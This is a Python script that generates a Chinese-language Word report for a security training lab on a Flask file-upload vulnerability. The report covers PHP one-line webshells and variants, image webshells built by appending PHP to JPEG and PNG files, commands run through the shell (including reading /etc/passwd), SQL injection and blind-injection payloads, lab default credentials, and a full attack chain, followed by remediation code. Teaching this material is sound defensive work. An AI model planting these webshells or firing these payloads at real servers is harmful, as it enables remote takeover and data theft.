#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""生成文件上传漏洞完整Word分析报告"""
import os
from docx import Document
from docx.shared import Pt, RGBColor
from docx.enum.text import WD_ALIGN_PARAGRAPH
from docx.enum.table import WD_TABLE_ALIGNMENT
from docx.oxml.ns import qn, nsdecls
from docx.oxml import parse_xml

doc = Document()

# ========== 全局样式 ==========
style = doc.styles['Normal']
font = style.font
font.name = 'Microsoft YaHei'
font.size = Pt(11)
style.element.rPr.rFonts.set(qn('w:eastAsia'), 'Microsoft YaHei')

for i in range(1, 5):
    hs = doc.styles[f'Heading {i}']
    hs.font.name = 'Microsoft YaHei'
    hs.element.rPr.rFonts.set(qn('w:eastAsia'), 'Microsoft YaHei')

def add_code(doc, text, green=False):
    p = doc.add_paragraph()
    p.paragraph_format.space_before = Pt(4)
    p.paragraph_format.space_after = Pt(4)
    fill = "E8F5E9" if green else "FFEBEE"
    shading = parse_xml(f'<w:shd {nsdecls("w")} w:fill="{fill}" w:val="clear"/>')
    p.paragraph_format.element.get_or_add_pPr().append(shading)
    run = p.add_run(text)
    run.font.name = 'Courier New'
    run.font.size = Pt(9)
    return p

def add_box(doc, text, color):
    p = doc.add_paragraph()
    p.paragraph_format.space_before = Pt(4)
    p.paragraph_format.space_after = Pt(4)
    fill = "FFCDD2" if color == "red" else "C8E6C9"
    shading = parse_xml(f'<w:shd {nsdecls("w")} w:fill="{fill}" w:val="clear"/>')
    p.paragraph_format.element.get_or_add_pPr().append(shading)
    run = p.add_run(text)
    run.bold = True
    run.font.size = Pt(11)
    return p

def shade(cell, color):
    s = parse_xml(f'<w:shd {nsdecls("w")} w:fill="{color}" w:val="clear"/>')
    cell._tc.get_or_add_tcPr().append(s)

def add_table(doc, data, col_widths=None):
    rows_n = len(data)
    cols_n = len(data[0])
    table = doc.add_table(rows=rows_n, cols=cols_n, style='Light Grid Accent 1')
    table.alignment = WD_TABLE_ALIGNMENT.CENTER
    for i, row_data in enumerate(data):
        for j, cell_text in enumerate(row_data):
            table.rows[i].cells[j].text = cell_text
            for p in table.rows[i].cells[j].paragraphs:
                p.alignment = WD_ALIGN_PARAGRAPH.CENTER
                for r in p.runs:
                    r.font.size = Pt(10)
            if i == 0:
                shade(table.rows[i].cells[j], "1A237E")
                for p in table.rows[i].cells[j].paragraphs:
                    for r in p.runs:
                        r.font.color.rgb = RGBColor(0xFF, 0xFF, 0xFF)
    return table

# ===== 封面 =====
for _ in range(4):
    doc.add_paragraph("")
t = doc.add_paragraph()
t.alignment = WD_ALIGN_PARAGRAPH.CENTER
r = t.add_run("文件上传漏洞分析与修复报告")
r.font.size = Pt(26)
r.bold = True
r.font.color.rgb = RGBColor(0x1a, 0x1a, 0x2e)

doc.add_paragraph("")
s = doc.add_paragraph()
s.alignment = WD_ALIGN_PARAGRAPH.CENTER
r = s.add_run("——基于 Flask 的一句话木马上传漏洞实验——")
r.font.size = Pt(14)
r.font.color.rgb = RGBColor(0x45, 0x45, 0x45)

for _ in range(4):
    doc.add_paragraph("")

info = doc.add_paragraph()
info.alignment = WD_ALIGN_PARAGRAPH.CENTER
r = info.add_run("实验项目：Web 安全漏洞分析与修复\n课程名称：网络安全实训\n报告日期：2026年7月")
r.font.size = Pt(12)

doc.add_page_break()

# ===== 目录 =====
doc.add_heading("目  录", level=1)
for i, t in enumerate(["漏洞概述","一句话木马原理详解","实验环境与代码分析",
    "漏洞复现步骤（Burp Suite实操）","图片马（JPEG/PNG隐藏木马）",
    "布尔盲注与SQL注入联动分析","修复方案详解","修复前后代码对比","安全编码规范总结"], 1):
    p = doc.add_paragraph(f"第{i}章  {t}")
    p.paragraph_format.space_after = Pt(6)
    p.runs[0].font.size = Pt(12)
doc.add_page_break()

# ===== 第一章 =====
doc.add_heading("第一章  漏洞概述", level=1)
doc.add_paragraph("文件上传漏洞（Unrestricted File Upload）是OWASP Top 10中常见的高危漏洞。攻击者通过上传包含恶意代码的文件（如一句话木马/WebShell），可以获得Web服务器的远程控制权限，执行任意系统命令、窃取数据、横向移动等。")

doc.add_heading("1.1 漏洞危害等级", level=2)
add_table(doc, [("评估项","详情"),("CVSS 3.0评分","9.8（Critical）"),("攻击向量","网络远程攻击"),("影响","完全控制服务器")])

doc.add_heading("1.2 漏洞成因", level=2)
doc.add_paragraph("本次Flask应用上传功能存在三个关键安全问题：")
add_box(doc, "🔴 漏洞1：无文件后缀名检查——允许上传.php、.phtml等可执行脚本", "red")
add_box(doc, "🔴 漏洞2：无MIME类型检查——不验证Content-Type", "red")
add_box(doc, "🔴 漏洞3：使用原始文件名保存——存在路径穿越风险(../)", "red")

# ===== 第二章 =====
doc.add_heading("第二章  一句话木马原理详解", level=1)
doc.add_heading("2.1 什么是一句话木马", level=2)
doc.add_paragraph("一句话木马（WebShell）是一段极短的恶意代码（通常仅几十字节），攻击者将其隐藏在上传的文件中。当服务器处理该文件时，木马代码被执行，攻击者通过HTTP请求控制服务器。")

doc.add_heading("2.2 经典PHP一句话木马", level=2)
doc.add_paragraph("最基本的PHP一句话木马仅22个字节：")
add_code(doc, '<?php @eval($_POST["cmd"]); ?>')

doc.add_heading("2.3 代码拆解分析", level=2)
add_table(doc, [("代码段","作用"),('<?php...?>',"PHP代码标记，执行中间代码"),("@","错误抑制符，隐藏输出"),("eval()","将字符串作PHP代码执行——核心危险函数"),('$_POST["cmd"]',"接收HTTP POST的cmd参数")])

doc.add_heading("2.4 一句话木马变种", level=2)
add_table(doc, [("木马代码","说明"),
    ('<?php @system($_REQUEST["cmd"]); ?>',"用system()替代eval()，直接执行系统命令"),
    ('<?php @assert($_POST["cmd"]); ?>',"用assert()绕过部分WAF检测"),
    ('<?php $_GET["a"]($_POST["b"]); ?>',"变量函数调用，?a=assert动态执行"),
    ('<script language="php">...</script>',"Script标签形式绕过<?php过滤"),
    ('GIF89a<?php @eval($_POST["cmd"]); ?>',"GIF文件头+一句话木马")])

# ===== 第三章 =====
doc.add_heading("第三章  实验环境与代码分析", level=1)
doc.add_heading("3.1 开发环境", level=2)
add_table(doc, [("项目","说明"),("Web框架","Python Flask 3.1.3"),("数据库","SQLite 3"),("操作系统","Kali Linux"),("攻击工具","Burp Suite / 蚁剑 / curl")])

doc.add_heading("3.2 有漏洞代码（app.py）", level=2)
doc.add_paragraph("/upload路由核心代码，标注了所有安全漏洞位置：")
add_code(doc,
    'UPLOAD_DIR = os.path.join(os.path.dirname(__file__), "static", "uploads")\n'
    'app.config["MAX_CONTENT_LENGTH"] = 16 * 1024 * 1024\n\n'
    '@app.route("/upload", methods=["GET","POST"])\n'
    'def upload():\n'
    '    if "username" not in session:\n'
    '        return redirect("/login")\n'
    '    if request.method == "POST":\n'
    '        f = request.files["file"]\n'
    '        # ⚠️ 漏洞1：不做文件类型检查\n'
    '        # ⚠️ 漏洞2：不检查后缀\n'
    '        filename = f.filename  # ⚠️ 漏洞3：用原始文件名\n'
    '        save_path = os.path.join(UPLOAD_DIR, filename)\n'
    '        f.save(save_path)  # ⚠️ 路径穿越风险')

# ===== 第四章 =====
doc.add_heading("第四章  漏洞复现步骤（Burp Suite实操）", level=1)
doc.add_heading("4.1 准备一句话木马", level=2)
add_code(doc, "echo '<?php @eval($_POST[\"cmd\"]); ?>' > shell.php")

doc.add_heading("4.2 登录系统", level=2)
doc.add_paragraph("使用默认管理员账号登录：http://192.168.199.128:5000/login")
doc.add_paragraph("账号：admin / 密码：admin123（见HTML注释泄露）", style='List Bullet')

doc.add_heading("4.3 上传木马", level=2)
doc.add_paragraph("登录后访问 /upload 页面，选择 shell.php 上传。系统无任何检查，上传成功。")
add_code(doc, "http://192.168.199.128:5000/static/uploads/shell.php")

doc.add_heading("4.4 Burp Suite拦截+发送恶意请求", level=2)
doc.add_paragraph("使用Burp Suite拦截上传请求，可以观察到：")
doc.add_paragraph("原始文件名未被修改", style='List Bullet')
doc.add_paragraph("Content-Type未被验证", style='List Bullet')
doc.add_paragraph("无任何文件类型检查", style='List Bullet')
doc.add_paragraph("")
doc.add_paragraph("发送POST请求执行系统命令：")
add_code(doc,
    'POST /static/uploads/shell.php HTTP/1.1\n'
    'Host: 192.168.199.128:5000\n'
    'Content-Type: application/x-www-form-urlencoded\n\n'
    'cmd=system(\'whoami\');')

doc.add_heading("4.5 常用攻击命令", level=2)
add_table(doc, [("POST参数","执行效果"),
    ("cmd=system('whoami');","查看当前用户"),
    ("cmd=system('ls -la');","列出目录"),
    ("cmd=system('cat /etc/passwd');","读取密码文件"),
    ("cmd=system('ifconfig');","查看网络配置"),
    ("cmd=phpinfo();","查看PHP配置")])

# ===== 第五章 =====
doc.add_heading("第五章  图片马（JPEG/PNG隐藏木马）", level=1)
doc.add_paragraph("图片马（Image WebShell）将一句话木马隐藏在合法图片中。图片查看器只解析图像数据，而PHP服务器会执行文件中的所有PHP代码。")

doc.add_heading("5.1 JPEG图片马", level=2)
doc.add_paragraph("JPEG以FF D8开头、FF D9结束。图片查看器读到FF D9后停止，PHP引擎继续扫描<?php?>。")
add_code(doc,
    '# 创建合法JPEG文件头\n'
    'printf \'\\xff\\xd8\\xff\\xe0\\x00\\x10JFIF\\x00\\x01\\x01...\' > shell.jpg\n'
    '# 尾部追加一句话木马\n'
    'echo \'<?php @eval($_POST["cmd"]); ?>\' >> shell.jpg')

doc.add_heading("5.2 PNG图片马", level=2)
add_code(doc,
    '# 方法1：文件尾部追加\n'
    'cat base.png > shell.png\n'
    'echo \'<?php @eval($_POST["cmd"]); ?>\' >> shell.png\n\n'
    '# 方法2：PNG tEXt元数据块嵌入（更隐蔽）')

doc.add_heading("5.3 图片马原理图解", level=2)
doc.add_paragraph("JPEG文件结构：")
add_code(doc, '[FF D8][JFIF头][图像数据][FF D9][<?php @eval($_POST["cmd"]); ?>]\n'
    ' ↑ JPEG解析到此↑              ↑ PHP从这里执行↑')
doc.add_paragraph("PNG文件结构：")
add_code(doc, '[89 50 4E 47][IHDR][IDAT][IEND][<?php @eval($_POST["cmd"]); ?>]\n'
    ' ↑ PNG解析到此↑              ↑ PHP从这里执行↑')

# ===== 第六章 =====
doc.add_heading("第六章  布尔盲注与SQL注入联动分析", level=1)
doc.add_heading("6.1 判断注入点", level=2)
add_table(doc, [("输入","页面响应"),
    ("admin' --","登录成功✅ 存在注入"),
    ("admin' OR '1'='1' --","登录成功✅ 返回所有用户"),
    ("' AND 1=2 --","登录失败❌ 条件为假"),
    ("' AND 1=1 --","登录成功✅ 布尔盲注可行")])

doc.add_heading("6.2 布尔盲注猜解数据", level=2)
doc.add_paragraph("利用True/False响应逐字符猜解：")
add_code(doc,
    "# 猜解数据库名长度\n"
    "' AND LENGTH(database())=4 --  → 正常 → 长度=4\n"
    "# 逐字符猜解\n"
    "' AND SUBSTR(database(),1,1)='t' -- → 正常 → 第1字符=t\n"
    "' AND SUBSTR(database(),2,1)='e' -- → 正常 → 第2字符=e\n"
    "' AND SUBSTR(database(),3,1)='s' -- → 正常 → 第3字符=s\n"
    "' AND SUBSTR(database(),4,1)='t' -- → 正常 → 第4字符=t\n"
    "→ 数据库名: test")

doc.add_paragraph("")
p = doc.add_paragraph()
r = p.add_run("完整攻击链：")
r.bold = True
p.add_run("SQL注入窃取管理员密码 → 登录系统 → 上传一句话木马 → 获得服务器控制权")

# ===== 第七章 =====
doc.add_heading("第七章  修复方案详解", level=1)

doc.add_heading("7.1 文件后缀白名单", level=2)
add_box(doc, "✅ 只允许上传特定图片格式，拒绝所有可执行脚本后缀", "green")
add_code(doc,
    'ALLOWED_EXTENSIONS = {".jpg", ".jpeg", ".png", ".gif", ".bmp", ".webp"}\n'
    'ext = os.path.splitext(f.filename)[1].lower()\n'
    'if ext not in ALLOWED_EXTENSIONS:\n'
    '    return "不支持的文件类型"', green=True)

doc.add_heading("7.2 UUID重命名", level=2)
add_box(doc, "✅ 使用UUID随机字符串重命名，防止路径穿越", "green")
add_code(doc,
    'import uuid\n'
    'safe_filename = uuid.uuid4().hex + ext\n'
    'save_path = os.path.join(UPLOAD_DIR, safe_filename)', green=True)

doc.add_heading("7.3 MIME类型验证", level=2)
add_box(doc, "✅ 使用python-magic检测真实文件魔数，防止伪造扩展名", "green")
add_code(doc,
    'import magic\n'
    'mime_type = magic.from_file(save_path, mime=True)\n'
    'if not mime_type.startswith("image/"):\n'
    '    os.remove(save_path)\n'
    '    return "文件内容不合法"', green=True)

doc.add_heading("7.4 上传目录权限控制", level=2)
add_box(doc, "✅ 配置Web服务器禁止上传目录执行脚本", "green")
add_code(doc,
    '# Nginx配置\n'
    'location /static/uploads/ {\n'
    '    location ~ \\.php$ { deny all; }\n'
    '}', green=True)

doc.add_heading("7.5 参数化查询修复SQL注入", level=2)
add_box(doc, "✅ 使用参数化查询替代字符串拼接", "green")
add_code(doc,
    '# ❌ 漏洞：字符串拼接\n'
    'sql = f"SELECT * FROM users WHERE username = \'{username}\'"\n\n'
    '# ✅ 修复：参数化查询\n'
    'cursor.execute("SELECT * FROM users WHERE username = ?", (username,))', green=True)

doc.add_heading("7.6 综合安全建议", level=2)
for r_text in [
    "最小权限原则：Web进程运行在低权限用户下，上传目录不可执行",
    "纵深防御：后缀检查+MIME检测+UUID重命名+目录权限控制",
    "日志审计：记录所有上传操作（文件名/IP/时间/用户）",
    "WAF规则：拦截eval、system等敏感函数调用",
    "定期扫描：使用漏洞扫描工具检查已上传文件"]:
    doc.add_paragraph(r_text, style='List Bullet')

# ===== 第八章 =====
doc.add_heading("第八章  修复前后代码对比", level=1)
add_table(doc, [("对比项","有漏洞(app.py)","已修复(app_fixed.py)"),
    ("文件后缀检查","❌ 无检查","✅ 白名单限制"),
    ("文件命名","❌ 原始文件名","✅ UUID.hex+后缀"),
    ("MIME类型","❌ 无验证","✅ magic文件头检测"),
    ("路径穿越防护","❌ 无","✅ UUID天然防护"),
    ("SQL注入","❌ 字符串拼接","✅ 参数化查询")])

doc.add_paragraph("")
doc.add_heading("修复版完整代码（app_fixed.py上传部分）", level=2)
add_code(doc,
    '# ✅ 安全的文件上传\n'
    'ALLOWED_EXTENSIONS = {".jpg",".jpeg",".png",".gif",".bmp",".webp"}\n\n'
    '@app.route("/upload", methods=["GET","POST"])\n'
    'def upload():\n'
    '    if "username" not in session:\n'
    '        return redirect("/login")\n'
    '    if request.method == "POST":\n'
    '        f = request.files["file"]\n'
    '        ext = os.path.splitext(f.filename)[1].lower()\n'
    '        # ✅ 后缀白名单\n'
    '        if ext not in ALLOWED_EXTENSIONS:\n'
    '            return render_template("upload_fixed.html", upload_msg="不支持的文件类型")\n'
    '        # ✅ UUID重命名\n'
    '        safe_filename = uuid.uuid4().hex + ext\n'
    '        save_path = os.path.join(UPLOAD_DIR, safe_filename)\n'
    '        f.save(save_path)\n'
    '        # ✅ MIME验证\n'
    '        mime_type = magic.from_file(save_path, mime=True)\n'
    '        if not mime_type.startswith("image/"):\n'
    '            os.remove(save_path)\n'
    '            return render_template("upload_fixed.html", upload_msg="文件内容不合法")', green=True)

# ===== 第九章 =====
doc.add_heading("第九章  安全编码规范总结", level=1)

principles = [
    ("原则一：白名单机制","始终用白名单（明确允许什么）而非黑名单。明确只允许.jpg/.png等图片后缀，而不是禁止.php/.asp。"),
    ("原则二：输入不可信","用户提交的任何数据都不可信，必须严格验证。"),
    ("原则三：纵深防御","不要依赖单一防御。后缀检查+MIME检测+UUID重命名+目录权限控制，多层防护。"),
    ("原则四：最小权限","Web进程不以root运行。上传目录禁执行脚本。数据库用专有账号。"),
    ("原则五：安全默认","框架安全特性默认开启，敏感信息不硬编码。")]
for t, d in principles:
    doc.add_heading(t, level=2)
    doc.add_paragraph(d)

doc.add_paragraph("")
p = doc.add_paragraph()
p.alignment = WD_ALIGN_PARAGRAPH.CENTER
r = p.add_run("—— 报告结束 ——")
r.font.color.rgb = RGBColor(0x99, 0x99, 0x99)
r.font.size = Pt(12)

# 保存
out = "/root/flask-app-vuln/static/文件上传漏洞分析与修复报告.docx"
doc.save(out)
print(f"✅ Word报告已生成：{out}")
print(f"   文件大小：{os.path.getsize(out)/1024:.1f}KB")
